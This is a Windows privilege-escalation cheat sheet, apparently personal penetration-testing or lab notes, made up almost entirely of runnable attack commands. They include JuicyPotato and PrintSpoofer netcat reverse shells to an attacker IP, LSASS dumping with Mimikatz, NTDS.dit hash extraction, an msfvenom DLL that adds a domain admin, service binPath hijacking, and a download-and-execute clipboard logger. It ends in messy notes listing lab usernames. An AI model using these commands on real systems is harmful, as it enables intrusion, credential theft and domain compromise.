# Windows Privilege Escalation Guide

This guide outlines common techniques and commands for escalating privileges on a Windows system. It starts with basic enumeration and moves through exploiting specific privileges, system vulnerabilities, and credential theft.

-----

## Initial Enumeration

The first step is always to gather as much information as possible about the system, users, and running processes.

### System & Network Information

Understand the machine's configuration, patch level, and network state.

```shell
# General system information
systeminfo

# Network configuration
ipconfig /all
arp -a
route print

# Firewall and AV status
Get-MpComputerStatus

# Installed hotfixes and patches
wmic qfe
Get-HotFix | ft -AutoSize

# Installed applications
wmic product get name
Get-WmiObject -Class Win32_Product | select Name, Version

# Active network connections
netstat -ano
```

### User & Group Enumeration

Identify the current user, their privileges, and other users/groups on the system.

```shell
# Current user and context
echo %USERNAME%
whoami
whoami /priv
whoami /groups
whoami /user

# List local users and groups
net user
net localgroup
net localgroup administrators

# Domain account policies
net accounts
```

### Processes, Services, and Tasks

Examine running processes and scheduled tasks for potential vulnerabilities.

```shell
# List running processes and associated services
tasklist /svc

# List all scheduled tasks with verbose output
schtasks /query /fo LIST /v

# List pipes to check for inter-process communication
pipelist.exe /accepteula
gci \\.\pipe\
```

-----

## Exploiting Privileges & Group Memberships

Leverage specific user rights or group memberships to gain higher privileges.

### User Privileges (`whoami /priv`)

Check your token privileges. Certain privileges are highly exploitable.

#### **SeImpersonate** / **SeAssignPrimaryToken** (Potato Attacks)

These privileges allow a service account to impersonate other users, including `NT AUTHORITY\SYSTEM`.

```shell
# Example with JuicyPotato
# This is often run from an initial shell, like one gained via xp_cmdshell
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe" -t *

# Example with PrintSpoofer
PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> <PORT> -e cmd"
```

#### **SeDebugPrivilege**

Allows you to debug processes, including `lsass.exe`, to dump credentials.

```shell
# Dump the LSASS process memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Use Mimikatz to extract credentials from the dump file
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
exit
```

#### **SeTakeOwnershipPrivilege**

Allows you to take ownership of files or folders, even if you don't have explicit permissions.

```shell
# Check ownership of a file
cmd /c dir /q 'C:\Path\To\Sensitive\cred.txt'

# Take ownership of the file
takeown /f 'C:\Path\To\Sensitive\cred.txt'

# Grant yourself Full Control permissions
icacls 'C:\Path\To\Sensitive\cred.txt' /grant <your_username>:F

# Access the file
cat 'C:\Path\To\Sensitive\cred.txt'
```

#### **SeBackupPrivilege** / **SeRestorePrivilege**

Allows you to read/write any file on the system, bypassing standard ACLs. This is often used to grab the `NTDS.dit` file from a Domain Controller.

```shell
# Copy NTDS.dit and SYSTEM hive using robocopy with backup mode
robocopy /B C:\Windows\NTDS C:\temp ntds.dit
robocopy /B C:\Windows\System32\config C:\temp SYSTEM

# Dump hashes locally from the saved files
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### **SeLoadDriverPrivilege** (Print Operators)

Allows loading of kernel drivers. Abused by loading a vulnerable, signed driver to get arbitrary code execution in the kernel.

```shell
# Check privileges
whoami /priv

# Load a vulnerable driver (e.g., Capcom.sys)
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# Exploit the driver to get a SYSTEM shell
.\ExploitCapcom.exe
```

### Group Memberships

Certain local or domain groups grant powerful permissions.

#### **Backup Operators**

Members of this group are granted **SeBackupPrivilege** and **SeRestorePrivilege** by default. This allows them to bypass file permissions to read and write files, making it a powerful group for escalating privileges, especially on Domain Controllers.

```shell
# The primary attack is to copy the NTDS.dit database and SYSTEM registry hive
# This gives you all the domain password hashes

# Use robocopy's backup mode (/B) to copy the files, ignoring ACLs
robocopy /B C:\Windows\NTDS C:\temp\ ntds.dit
robocopy /B C:\Windows\System32\config C:\temp\ SYSTEM

# Once exfiltrated, use secretsdump to extract the hashes
impacket-secretsdump -ntds C:\temp\ntds.dit -system C:\temp\SYSTEM LOCAL
```

#### **DnsAdmins**

Members of this group can load an arbitrary DLL into the DNS service, which runs as `SYSTEM`.

```shell
# Create a malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user_to_add> /add /domain' -f dll -o adduser.dll

# Configure the DNS server to load the DLL
dnscmd.exe /config /serverlevelplugindll C:\Path\To\adduser.dll

# Restart the DNS service to trigger the payload
sc stop dns
sc start dns
```

#### **Server Operators**

Members can start and stop services. If a service is configured with a weak binary path or permissions, it can be abused.

```shell
# Check service configuration
sc qc <ServiceName>

# Reconfigure the service's binary path to execute your command
sc config <ServiceName> binPath= "cmd /c net localgroup Administrators <your_user> /add"

# Start the service to execute the payload
sc start <ServiceName>

# Cleanup
sc config <ServiceName> binpath= "<Original_Path>"
```

-----

## Attacking the OS & Services

Exploit vulnerabilities in the operating system, kernel, or installed services.

### Kernel Exploits

Outdated systems may be vulnerable to known kernel exploits. Always check the patch level first.

```shell
# Manually check system info against vulnerability databases
systeminfo
wmic qfe list brief

# Use an automated checker like Sherlock or WinPEAS
Import-Module .\Sherlock.ps1
Find-AllVulns

# Example: HiveNightmare (CVE-2021-36934) - Allows reading SAM file
.\HiveNightmare.exe
impacket-secretsdump -sam SAM-backup -system SYSTEM-backup LOCAL
```

### Service Misconfigurations

#### Unquoted Service Path

If a service path is unquoted and contains spaces, you can place a malicious executable in a higher-level directory to be executed instead.

```shell
# Find services with unquoted paths that are not in C:\Windows
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Example: Path is C:\Program Files\Some App\service.exe
# Place your malicious exe at C:\Program.exe
# Restart the service to trigger it
```

#### Weak Service Permissions

If your user has permissions to modify a service's configuration, you can change its binary path.

```shell
# Check permissions on a service
accesschk.exe /accepteula -quvcw <ServiceName>

# If you have permission, reconfigure and start the service
sc config <ServiceName> binpath="C:\path\to\your\payload.exe"
sc start <ServiceName>
```

### User Account Control (UAC) Bypass

On systems with UAC enabled, an administrator user runs with standard privileges until an action requires elevation. Bypassing UAC achieves a high-integrity shell without a prompt.

```shell
# Check if UAC is enabled and its level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Many UAC bypasses involve hijacking DLLs loaded by high-integrity processes
# Example: Place a malicious DLL where a trusted executable will find it first
# C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe might load a DLL from a user-writable path
```

-----

## Credential Theft & Hunting

Search for stored credentials in files, memory, and applications.

### Credential Hunting in Files

Look for passwords, API keys, and connection strings in common configuration files and user documents.

```shell
# Search all common config/text files for the word "password"
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Check PowerShell history
cat (Get-PSReadLineOption).HistorySavePath

# Check for saved PSCredential objects
$credential = Import-Clixml -Path 'C:\Path\To\pass.xml'
$credential.GetNetworkCredential().password
```

### Dumping Credentials

Extract passwords and hashes from memory, browsers, and password managers.

```shell
# List credentials saved by Windows Credential Manager
cmdkey /list

# Use LaZagne to dump passwords from many applications
.\lazagne.exe all

# Dump browser credentials
.\SharpChrome.exe logins /unprotect

# Dump Wi-Fi passwords
netsh wlan show profile
netsh wlan show profile "<ProfileName>" key=clear

# Find and crack KeePass databases
# 1. Get the database file
# 2. Convert to a hashcat-friendly format
python2.7 keepass2john.py database.kdbx > hash.txt
# 3. Crack the hash
hashcat -m 13400 hash.txt /path/to/wordlist.txt
```

### Pillaging User Data

Beyond credentials, look for sensitive data in application files.

```shell
# Check mRemoteNG connection files for stored credentials
# Decrypt them using a known script
python3 mremoteng_decrypt.py -s "<EncryptedString>" -p <MasterPassword>

# Extract cookies from browser databases
Invoke-SharpChromium -Command "cookies <domain.com>"

# Monitor the clipboard for sensitive information
IEX(New-Object Net.WebClient).DownloadString('https://.../Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

### Check for sensitive files

```shell
# for the userlist find and replace \n with ,
paste -sd ', ' data.txt
tr '\n' ' ' < data.txt | sed 's/ $/, /g; s/, / /'

# and then check for

check c:\ location for silly stuff
check with ls -force too for silly hidden files

findstr /spin "iamtheadministrator" *.*

Get-ChildItem -Path C:\ -Recurse -Force -Include .config,.ini,.xml,.bak,*.txt -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows\System32|SysWOW64' } | Select-String -Pattern "password="

Get-ChildItem -Path C:\ -Recurse -Force -Include .config,.ini,.xml,.bak,*.txt -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows\System32|SysWOW64' } | Select-String -Pattern "pwd=", "password=", "username=", "user="

Get-ChildItem -Path C:\ -Recurse -Force -Include .config,.ini,.xml,.bak,.txt,.ps1 -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'Windows\System32|SysWOW64|VMware|All Users|ProgramData' } | Select-String -Pattern "pwd", "pass", "password=", "username=", "user=", "marko", "zach", "Administrator", ryan, Administrator, Guest, krbtgt, DefaultAccount, ryan, marko, sunita, abigail, marcus, sally, fred, angela, felicia, gustavo, ulf, stevie, claire, paulo, steve, annette, annika, per, claude, melanie, zach, simon, naoki

# find a file via filename
Get-PSDrive -PSProvider FileSystem | ForEach-Object { Get-ChildItem -Path $_.Root -Recurse -Filter "confidential.txt" -ErrorAction SilentlyContinue }
```
